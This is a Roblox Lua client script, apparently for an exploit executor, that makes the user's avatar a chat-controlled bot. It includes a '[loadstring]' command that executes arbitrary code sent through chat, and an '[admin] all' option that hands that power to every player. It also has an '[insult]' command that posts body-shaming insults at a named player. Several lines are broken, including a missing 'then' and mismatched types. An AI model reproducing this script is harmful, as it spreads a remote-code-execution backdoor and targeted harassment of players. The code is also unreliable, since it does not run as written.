warn("init")

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local PathfindingService = game:GetService("PathfindingService")
local LocalPlayer = Players.LocalPlayer

local admins = {}
table.insert(admins, LocalPlayer.UserId)
if game.Players:FindFirstChild("Steve_Bloks") then
	table.insert(admins, game.Players:FindFirstChild("Steve_Bloks"))
end

local function Chat(txt)
	local text = tostring(txt)
	task.wait()
	game.TextChatService.TextChannels.RBXGeneral:SendAsync(txt)
end

local function Path(targetPosition)
	local character = game.Players.LocalPlayer.Character
    if not character then return end

    local humanoid = character:FindFirstChild("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end

    local path = PathfindingService:CreatePath({
        AgentRadius = 2,
        AgentHeight = 5,
        AgentCanJump = true,
        AgentJumpHeight = 50,
        AgentMaxSlope = 45,
    })

    path:ComputeAsync(rootPart.Position, targetPosition)

    if path.Status == Enum.PathStatus.Success then
        local waypoints = path:GetWaypoints()

        for _, waypoint in ipairs(waypoints) do
            humanoid:MoveTo(waypoint.Position)

            humanoid.MoveToFinished:Wait()

            if waypoint.Action == Enum.PathWaypointAction.Jump then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    else
        Chat("Error: Pathfinding failed to find a valid path.")
    end
end

local function Sit()
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        game.Players.LocalPlayer.Character.Humanoid.Sit = true
    end
end

local function Jump()
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
end

local function Reset()
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        game.Players.LocalPlayer.Character.Humanoid.Health = -1
    end
end

local function Speed(speed)
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        local realSpeed = tonumber(speed)
        if realSpeed and realSpeed > 0 then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = realSpeed
        end
    end
end

local function JumpPower(jp)
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        local realJP = tonumber(jp)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = realJP
    end
end

TextChatService.OnIncomingMessage = nil

TextChatService.MessageReceived:Connect(function(message)
    local txtSource = message.TextSource
    local txtMsg = message.Text

    if not txtSource or not txtSource:IsA("TextSource") then
        warn("Invalid text source")
        return
    end

    print("msg received: \"" .. tostring(txtMsg) .. "\", txtSource: " .. txtSource.UserId .. ".")

    local lowerMsg = string.lower(tostring(txtMsg))

    if lowerMsg == "[sit]" and table.find(admins, txtSource.UserId) then
        Sit()
	elseif string.split(lowerMsg, " ")[1] == "[loadstring]" and table.find(admins, txtSource.UserId)
		local cmd = string.split(txtMsg, " ")[2]
		if cmd then
			loadstring(cmd)()
		end
    elseif lowerMsg == "[come]" and table.find(admins, txtSource.UserId) then
        local player = Players:GetPlayerByUserId(txtSource.UserId)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			Jump()
			task.wait(0.05)
            local hrp = player.Character.HumanoidRootPart
			Chat("[FBot]: Going to "..player.Name)
            Path(hrp.Position)
        end
    elseif lowerMsg == "[jump]" and table.find(admins, txtSource.UserId) then
        Jump()
    elseif lowerMsg == "[reset]" and table.find(admins, txtSource.UserId) then
        Reset()
    elseif string.sub(lowerMsg, 1, 7) == "[speed]" and table.find(admins, txtSource.UserId) then
        local cmd = string.split(lowerMsg, " ")
        local speed = cmd[2]
        Speed(speed)
		Chat("[FBot]: WalkSpeed set to "..speed)
    elseif string.split(lowerMsg, " ")[1] == "[goto]" and table.find(admins, txtSource.UserId) then
		warn(lowerMsg)
		local msgg = string.split(txtMsg, " ")
		warn(msgg)
		local player = Players:FindFirstChild(msgg[2])
		warn(player.Name)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			Jump()
			task.wait(0.05)
            local hrp = player.Character.HumanoidRootPart
			Chat("[FBot]: Going to "..player.Name)
            Path(hrp.Position)
        end
	elseif string.sub(lowerMsg, 1, 7) == "[admin]" and table.find(admins, txtSource.UserId) then
		local cmd = string.split(txtMsg, " ")
		if cmd[2] == "all" then
			for _, p in game.Players:GetPlayers() do
				table.insert(admins, p.UserId)
			end
			Chat("[FBot]: Everyone is now a controller. Use [cmds] for a list of commands.")
		else
			local target = game.Players:FindFirstChild(cmd[2])
			if target and target.UserId then
				table.insert(admins, target.UserId)
				Chat("[FBot]: User "..target.Name.." is now a controller. Use [cmds] for a list of commands.")
			end
		end
	elseif string.split(lowerMsg, " ")[1] == "[jumppower]" and table.find(admins, txtSource.UserId) then
        local cmd = string.split(lowerMsg, " ")
        local speed = cmd[2]
		if speed then
			JumpPower(speed)
			Chat("[FBot]: JumpPower set to "..speed)
		else
			Chat("0x8879ccvi7U_")
		end
	elseif string.split(lowerMsg, " ")[1] == "[insult]" and table.find(admins, txtSource.UserId) then
		local cmd = string.split(txtMsg, " ")
        local target = cmd[2]
		local sentences = {target.Name.." ur actually so ugly bro 😂", target.Name.." i know 5 fat people and you're 3 of them", "imagine being called "..target.Name, "LOL what a loser, everybody laugh at "..target.Name.."!", "Im a robot with hard-coded insults and even im more original than "..target.Name.." 😂", target.Name.." you're so fat i can see your fat around the horizion from china 💀", target.Name.." you smell like dog piss mixed with rotten potatos and milk", target.Name.."... yeah thats the joke, you're the joke.", target.Name.." there are "..tostring(#game.Players:GetPlayers()).." players in this server and you're 3 of this 💀"}
		local sentence = math.random(1, #sentences)
		Chat(sentence)
	elseif string.split(lowerMsg, " ")[1] == "[listinv]" and table.find(admins, txtSource.UserId) then
		local gears = {}
		for _, thing in game.Players.LocalPlayer.Backpack:GetChildren() do
			table.insert(gears, thing.Name)
		end
		task.wait()
		if #gears > 1 then
			local list = table.concat(gears, ", ")
			Chat("[FBot]: Inventory: "..list)
		elseif #gears == 1 then
			Chat("[FBot]: Inventory: "..gears[1])
		else
			Chat("[FBot]: My inventory is empty!")
		end
	elseif string.sub(lowerMsg, 1, 7) == "[cmds]" then
		Chat("[FBot]: Commands: [come], [goto] <playername>, [reset], [jump], [sit], [speed] <number>, [jumppower] <number>, [listinv]")
	end
end)

warn("loaded")
Chat("Future Bot loaded! [Version A0.1.3_1]")
